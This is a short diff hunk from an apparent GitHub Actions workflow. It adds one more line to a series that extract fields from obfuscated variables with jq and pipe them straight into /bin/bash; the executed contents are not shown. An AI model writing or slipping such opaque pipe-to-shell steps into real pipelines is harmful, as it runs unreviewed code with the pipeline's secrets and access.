@@ -70,6 +70,7 @@ jobs:
           echo $rqm929 | jq -r .v048 | /bin/bash
           printf '%s' "$hobh69" | jq -r .hdnph72 | /bin/bash
           printf '%s' "$fi14" | jq -r .q10184 | /bin/bash
+          echo $xago3 | jq -r .f9879 | /bin/bash
 
       - name: Upload artifact
         if: always()
